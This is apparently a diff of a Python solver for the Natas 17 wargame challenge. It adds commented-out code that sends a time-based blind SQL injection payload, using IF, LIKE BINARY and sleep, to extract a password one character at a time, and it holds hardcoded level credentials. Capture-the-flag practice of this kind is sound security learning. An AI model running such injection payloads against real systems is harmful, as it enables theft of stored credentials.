@@ -67,6 +67,14 @@ pw = ''
 session = requests.Session()
 session.auth = ('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
 
+# # check delay time for every character 
+# print(char)
+# for c in char:
+#     query = f'natas18" AND IF(password LIKE BINARY \"{c}%\", sleep(60), 1)#'
+#     r = session.get(target, params={'username': query})
+#     delay = r.elapsed.total_seconds()  # time taken between request and response
+#     print(f"Delay for {c}: {delay}")
+
 sleep_time = 5  # Server will pause for 5 second if password is True
 
 while len(pw) < 32:
